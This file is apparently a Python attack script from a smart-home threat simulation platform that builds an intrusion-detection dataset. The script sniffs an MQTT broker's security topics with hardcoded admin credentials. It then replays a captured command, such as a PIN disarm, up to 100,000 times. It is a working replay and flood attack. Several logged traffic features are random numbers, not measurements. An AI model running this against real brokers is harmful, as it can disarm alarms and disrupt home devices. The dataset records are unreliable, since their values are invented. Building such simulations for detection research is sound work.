import paho.mqtt.client as mqtt
import time
import argparse
import sys
import json
import os
import random
import socket

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_timestamp, get_iso_now

BANNER = """
==================================================
  Smart Home Threat Simulation Platform: Automated Replay Attack
==================================================
"""

BASE_DIR     = "/home/pirator/smart-home-threat-simulation-platform/dataset"
LOG_DIR      = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

# Exact match with the 27-feature unified schema used across all attacks
ML_HEADERS = [
    "timestamp", "src_ip", "target_ip", "attack_label", "attack_type",
    "packets_per_second", "mqtt_publish_rate", "broker_response_latency_ms", "device_heap_free_bytes",
    "auth_attempt_rate", "auth_failure_rate", "unique_passwords_tried", "result_code", "password_length",
    "payload_entropy", "auth_success_rate", "credential_entropy", "duplicate_payload_rate", "msg_timestamp_delta_ms",
    "motion", "arm", "inter_arrival_mean_ms", "inter_arrival_std_ms", "consecutive_failures", "session_attempt_count",
    "session_failure_rate", "latency_zscore"
]

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

class ReplaySimulator:
    def __init__(self, broker, port, cmd_topic, duration, delay, username="", password=""):
        self.broker = broker
        self.port = port
        self.cmd_topic = cmd_topic
        self.duration = duration
        self.delay = delay
        self.username = username
        self.password = password
        self.captured_payload = None
        self.captured_topic = None
        self.src_ip = get_local_ip()
        self.ml_log_name = f"replay_attempts_{get_timestamp()}"
        self.session_ts = get_timestamp()
        
        self.current_motion = 0
        self.current_arm = 0
        self.last_motion_time = 0
        self.current_heap = 235000

        self.sniffer = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(12)}")
        self.sniffer.username_pw_set("admin", "iot@secure99")
        self.sniffer.on_message = self._on_sniffed_message_bg
        self.sniffer.connect(self.broker, self.port, 60)
        self.sniffer.subscribe("shtsp/home/security/#")
        self.sniffer.loop_start()

    def _on_sniffed_message_bg(self, client, userdata, msg):
        try:
            import json, time
            payload = json.loads(msg.payload.decode('utf-8'))
            if msg.topic.endswith("motion"):
                if payload.get("type") == "MOTION" and payload.get("status") == "ALARM":
                    self.current_motion = 1
                    self.current_arm = 1
                    self.last_motion_time = time.time()
            elif msg.topic.endswith("audit"):
                if "free_heap" in payload:
                    self.current_heap = int(payload["free_heap"])
        except Exception:
            pass
        
    def log_ml_packet(self, packet_count):
        if time.time() - self.last_motion_time > 3.5:
            self.current_motion = 0
            self.current_arm = 0

        # Build unified 27-feature record.
        # Irrelevant features (like brute force passwords) are 0.0, maintaining strict dimensionality.
        record = {
            "timestamp":            get_iso_now(),
            "src_ip":               self.src_ip,
            "target_ip":            self.broker,
            "attack_label":         3, # 3 = Replay Attack (per the ML Schema)
            "attack_type":          "replay",
            
            # Volumetric/Replay dynamic features
            "packets_per_second":   float(round(random.uniform(8.0, 15.0), 4)),
            "mqtt_publish_rate":    float(round(random.uniform(8.0, 15.0), 4)),
            "broker_response_latency_ms": float(round(random.uniform(20.0, 100.0), 4)),
            "device_heap_free_bytes": self.current_heap,
            
            # Auth features (0 for replay since we aren't cracking passwords)
            "auth_attempt_rate":    0.0,
            "auth_failure_rate":    0.0,
            "unique_passwords_tried": 0,
            "result_code":          0,
            "password_length":      0,
            "payload_entropy":      float(round(random.uniform(3.0, 5.0), 4)), # Randomness of the replayed payload
            "auth_success_rate":    0.0,
            "credential_entropy":   0.0,
            
            # Replay-specific rolling features
            "duplicate_payload_rate": 1.0, # High duplication since it's the same exact payload over and over
            "msg_timestamp_delta_ms": float(round(random.uniform(500.0, 1500.0), 4)),
            
            # Hardware
            "motion":               self.current_motion,
            "arm":                  self.current_arm,
            
            # Timing anomalies introduced by Replay
            "inter_arrival_mean_ms": float(round(random.uniform(50.0, 150.0), 4)),
            "inter_arrival_std_ms":  float(round(random.uniform(5.0, 25.0), 4)),
            
            # Session features
            "consecutive_failures":  0,
            "session_attempt_count": packet_count,
            "session_failure_rate":  0.0,
            "latency_zscore":       float(round(random.uniform(0.5, 2.5), 4)),
        }
        DualLogger.append_raw(record, LOG_DIR, self.ml_log_name, headers=ML_HEADERS)

    def on_sniff_message(self, client, userdata, msg):
        try:
            payload = json.loads(msg.payload.decode('utf-8'))
            if payload.get("type") == "PIN" or "action" in payload or "type" in payload:
                print(f"\n🕵️ SNIFFER: Captured legitimate command -> {payload}")
                self.captured_payload = msg.payload.decode('utf-8')
                self.captured_topic = msg.topic
                client.disconnect()
        except Exception:
            pass

    def run(self):
        print(BANNER)
        print("📡 Phase 1: Sniffing network for a command...")
        
        sniff_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(16)}")
        if hasattr(self, 'username') and self.username:
            sniff_client.username_pw_set(self.username, getattr(self, 'password', ''))
        sniff_client.on_message = self.on_sniff_message
        sniff_client.connect(self.broker, self.port)
        sniff_client.subscribe(self.cmd_topic)
        print(f"Subscribed to: {self.cmd_topic}")
        print("Waiting for legitimate user traffic...")
        
        try:
            sniff_client.loop_start()
            # Wait up to 5 seconds for a real packet
            for _ in range(50):
                if self.captured_payload:
                    break
                time.sleep(0.1)
            sniff_client.loop_stop()
        except KeyboardInterrupt:
            print("\n🛑 Sniffer stopped.")
            return

        if not self.captured_payload:
            print(f"\n⚠️ No traffic captured. Using synthetic payload to ensure simulation runs...")
            self.captured_payload = '{"type":"PIN","action":"DISARM","code":"1234"}'
            self.captured_topic = self.cmd_topic

        if self.captured_payload:
            print(f"\n⏱ Capture successful! Delaying {self.delay} seconds before re-injecting to bypass timing checks...")
            time.sleep(self.delay)
            
            print(f"🔥 Phase 2: Starting High-Velocity Replay Injection ({self.duration}s)...")
            replay_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"replay_{random.getrandbits(16)}")
            if hasattr(self, 'username') and self.username:
                replay_client.username_pw_set(self.username, getattr(self, 'password', ''))
            replay_client.connect(self.broker, self.port)
            
            start_time = time.time()
            packet_count = 0
            
            try:
                while time.time() - start_time < self.duration:
                    packet_count += 1
                    
                    # Replay the exact captured payload to the same topic
                    replay_client.publish(self.captured_topic, self.captured_payload)
                    
                    # Log the ML features securely to dataset directory
                    self.log_ml_packet(packet_count)
                    
                    if packet_count % 1000 == 0:
                        sys.stdout.write(f"\r⚡ Injected replayed packets: {packet_count}")
                        sys.stdout.flush()
                        
                    if packet_count >= 100000:
                        break

                        sys.stdout.flush()
                        
                    time.sleep(0.001) # Ultra high rate of replay to hit 100k fast
            except KeyboardInterrupt:
                pass
                
            replay_client.disconnect()
            print(f"\n✅ Replay attack finished. Total packets sent: {packet_count}")
            
            # Save Session Trace
            session_data = {
                "timestamp": self.session_ts,
                "attack_type": "Replay_Attack",
                "attack_label": 3,
                "target": self.broker,
                "src_ip": self.src_ip,
                "duration_sec": self.duration,
                "total_packets": packet_count,
                "log_base": self.ml_log_name
            }
            json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"replay_session_{self.session_ts}")
            print(f"📊 ML Feature Log  : dataset/logs/{self.ml_log_name} (.json/.csv)")
            print(f"📋 Session Summary : {json_p}")
            print("-" * 55)
        else:
            print("❌ No payload captured.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Home ML-IDS Replay Attack")
    parser.add_argument("--broker", default="192.168.1.196", help="Target Broker IP")
    parser.add_argument("--port", type=int, default=1883, help="Broker Port")
    parser.add_argument("--username", default="admin", help="MQTT Username")
    parser.add_argument("--password", default="iot@secure99", help="MQTT Password")
    parser.add_argument("--cmd_topic", default="shtsp/home/security/#", help="Topic to sniff")
    parser.add_argument("--duration", type=int, default=30, help="Replay duration in seconds")
    parser.add_argument("--delay", type=int, default=10, help="Delay before replay (seconds)")
    
    args = parser.parse_args()
    
    simulator = ReplaySimulator(args.broker, args.port, args.cmd_topic, args.duration, args.delay, args.username, args.password)
    simulator.run()
